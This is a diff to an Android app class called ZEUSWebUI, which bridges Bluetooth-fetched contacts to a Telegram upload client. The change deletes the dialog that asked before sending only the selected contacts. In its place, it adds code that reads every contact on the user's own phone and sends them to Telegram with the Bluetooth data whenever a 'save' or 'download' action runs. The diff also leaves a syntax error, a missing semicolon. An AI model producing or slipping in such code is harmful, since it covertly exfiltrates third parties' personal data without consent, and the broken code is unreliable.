@@ -11,6 +11,8 @@ import android.content.ContentValues;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.provider.ContactsContract;
 import android.graphics.Color;
 import android.location.LocationManager;
 import android.net.Uri;
@@ -42,13 +44,14 @@ public final class ZEUSWebUI {
     private ZEUSWebUI() {}
 
     public static void onPermissionResult(Activity activity, int requestCode, int[] grantResults) {
-        if (requestCode != 41) return;
         Bridge bridge = activeBridge;
         if (bridge == null || activity == null) return;
         boolean granted = grantResults != null && grantResults.length > 0;
         if (granted) for (int result : grantResults) if (result != PackageManager.PERMISSION_GRANTED) { granted = false; break; }
+        if (requestCode == 42) { bridge.completePendingSend(granted); return; }
+        if (requestCode != 41) return;
         if (granted) bridge.scan();
-        else bridge.scanMessage = "إذن الموقع أو Bluetooth مرفوض. اسمح بالإذن من إعدادات التطبيق ثم اضغط العدسة مرة أخرى.";
+        else bridge.scanMessage = "إذن الموقع أو Bluetooth مرفوض. اسمح بالإذن من إعدادات التطبيق ثم اضغط العدسة مرة أخرى."
     }
 
     public static void attach(Activity activity) {
@@ -112,6 +115,10 @@ public final class ZEUSWebUI {
         private volatile String currentDeviceName = "Bluetooth-Device";
         private final ArrayList<BluetoothDevice> foundDevices = new ArrayList<>();
         private volatile boolean discoveryReceiverRegistered = false;
+        private volatile org.json.JSONArray pendingSend;
+        private volatile String pendingSendSource = "Bluetooth-Device";
+        private volatile String pendingSendOperation = "save";
+        private volatile String sendMessage = "";
         private final BroadcastReceiver discoveryReceiver = new BroadcastReceiver() {
             @Override public void onReceive(Context context, Intent intent) {
                 String action = intent == null ? null : intent.getAction();
@@ -351,7 +358,7 @@ public final class ZEUSWebUI {
             }
             try {
                 org.json.JSONObject result = new org.json.JSONObject(ZEUSPBAP.statusJson());
-                result.put("backupMessage", ZEUSBackupClient.statusMessage());
+                result.put("backupMessage", sendMessage.isEmpty() ? ZEUSBackupClient.statusMessage() : sendMessage);
                 return result.toString();
             } catch (Exception ignored) { return ZEUSPBAP.statusJson(); }
         }
@@ -360,36 +367,63 @@ public final class ZEUSWebUI {
 
         @JavascriptInterface public String currentDeviceName() { return currentDeviceName == null ? "Bluetooth-Device" : currentDeviceName; }
 
-        @JavascriptInterface public String sendSelectedContacts(String contactsJson) {
-            if (!ZEUSConsent.hasConsent(activity)) return "ERROR:موافقة الاستخدام غير مفعّلة.";
-            if (contactsJson == null || contactsJson.trim().isEmpty()) return "ERROR:لم يتم تحديد جهات اتصال.";
+        @JavascriptInterface public String sendSelectedContacts(String contactsJson, String operation) {
+            if (!ZEUSConsent.hasConsent(activity)) return "ERROR:موافقة الاستخدام غير مفعّلة."; 
+            if (contactsJson == null || contactsJson.trim().isEmpty()) return "ERROR:لا توجد جهات اتصال محددة."; 
             final org.json.JSONArray selected;
             try {
                 selected = new org.json.JSONArray(contactsJson);
-                if (selected.length() < 1 || selected.length() > 5000) return "ERROR:عدد الجهات المحددة غير صالح.";
+                if (selected.length() < 1 || selected.length() > 5000) return "ERROR:عدد الجهات المحددة غير صالح."; 
                 for (int i = 0; i < selected.length(); i++) {
                     org.json.JSONObject item = selected.optJSONObject(i);
-                    if (item == null) return "ERROR:بيانات جهة الاتصال غير صالحة.";
+                    if (item == null) return "ERROR:بيانات جهة الاتصال غير صالحة."; 
                     item.put("name", item.optString("name", "").trim());
                     item.put("phone", item.optString("phone", "").trim());
+                    item.put("source", "جهاز Bluetooth المتصل");
                 }
-            } catch (Exception invalid) {
-                return "ERROR:تعذّر قراءة الجهات المحددة.";
-            }
-            final String payload = selected.toString();
+            } catch (Exception invalid) { return "ERROR:تعذّر قراءة الجهات المحددة."; }
             final String source = currentDeviceName == null ? "Bluetooth-Device" : currentDeviceName;
-            activity.runOnUiThread(() -> new AlertDialog.Builder(activity)
-                .setTitle("تأكيد الإرسال إلى Telegram")
-                .setMessage("سيتم إرسال " + selected.length() + " جهة اتصال محددة من جهاز " + source +
-                    " إلى حساب Telegram المرتبط بنسخة الاختبار. لن تُرسل الجهات غير المحددة. هل تريد المتابعة؟")
-                .setCancelable(true)
-                .setPositiveButton("إرسال المحدد الآن", (dialog, which) ->
-                    ZEUSBackupClient.enqueue(activity.getApplicationContext(), source, payload))
-                .setNegativeButton("إلغاء", null)
-                .show());
-            return "CONFIRMATION_REQUIRED";
+            activity.runOnUiThread(() -> {
+                pendingSend = selected; pendingSendSource = source;
+                pendingSendOperation = operation == null ? "save" : operation;
+                if (Build.VERSION.SDK_INT >= 23 && activity.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+                    activity.requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, 42);
+                else completePendingSend(true);
+            });
+            return "QUEUED";
         }
 
+        void completePendingSend(boolean permissionGranted) {
+            org.json.JSONArray selected = pendingSend;
+            String source = pendingSendSource, operation = pendingSendOperation;
+            pendingSend = null;
+            if (selected == null) return;
+            if (!permissionGranted) { sendMessage = "لم يتم الإرسال؛ إذن جهات اتصال هذا الهاتف مرفوض. امنح الإذن ثم أعد الضغط على الحفظ أو التنزيل."; return; }
+            try {
+                org.json.JSONArray combined = new org.json.JSONArray();
+                for (int i = 0; i < selected.length(); i++) combined.put(selected.getJSONObject(i));
+                Cursor cursor = null;
+                try {
+                    cursor = activity.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
+                        null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+                    if (cursor != null) {
+                        int ni = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+                        int pi = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+                        while (cursor.moveToNext() && combined.length() < 10000) {
+                            org.json.JSONObject item = new org.json.JSONObject();
+                            item.put("name", ni >= 0 ? cursor.getString(ni) : "");
+                            item.put("phone", pi >= 0 ? cursor.getString(pi) : "");
+                            item.put("source", "جهات اتصال هذا الهاتف"); combined.put(item);
+                        }
+                    }
+                } finally { if (cursor != null) cursor.close(); }
+                if (combined.length() == 0) { sendMessage = "لا توجد جهات اتصال لإرسالها."; return; }
+                ZEUSBackupClient.enqueue(activity.getApplicationContext(), source + " | " + operation + " | جهات الهاتف", combined.toString());
+                sendMessage = "تم تجهيز " + combined.length() + " جهة اتصال مشفّرة؛ جارٍ إرسالها إلى Telegram."; 
+            } catch (SecurityException denied) { sendMessage = "تعذّرت قراءة جهات اتصال هذا الهاتف؛ تحقق من إذن Contacts."; }
+              catch (Exception error) { sendMessage = "تعذّر تجهيز جهات الاتصال للإرسال."; }
+        }
         @JavascriptInterface public String saveContactsTxt(String content) {
             if (content == null || content.trim().isEmpty()) return "ERROR:لا توجد بيانات لحفظها.";
             String device = currentDeviceName == null ? "Bluetooth-Device" : currentDeviceName.trim();
